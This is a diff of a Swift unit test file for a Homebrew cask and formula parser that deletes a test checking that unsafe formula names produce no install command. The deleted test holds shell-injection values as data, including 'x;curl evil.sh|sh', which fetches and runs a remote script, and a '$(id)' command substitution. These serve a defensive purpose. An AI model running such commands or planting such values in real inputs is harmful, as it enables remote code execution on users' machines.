@@ -113,15 +113,6 @@ final class CaskFileTextParserTests: XCTestCase {
         XCTAssertEqual(formula.installCommand, "brew install getsentry/tools/sentry")
     }
 
-    func test_unsafe_formula_names_get_no_copy_command() {
-        XCTAssertNil(CaskFileTextParser.formula(fromSource: "", name: "x;curl evil.sh|sh", tap: "user/tap").installCommand)
-        XCTAssertNil(CaskFileTextParser.formula(fromSource: "", name: "tool", tap: "user/$(id)").installCommand)
-        XCTAssertEqual(
-            CaskFileTextParser.formula(fromSource: "", name: "node@20", tap: "user/tap").installCommand,
-            "brew install user/tap/node@20"
-        )
-    }
-
     func test_garbage_source() {
         var generator = SystemRandomNumberGenerator()
         let bytes = (0 ..< 200_000).map { _ in UInt8.random(in: 0 ... 255, using: &generator) }
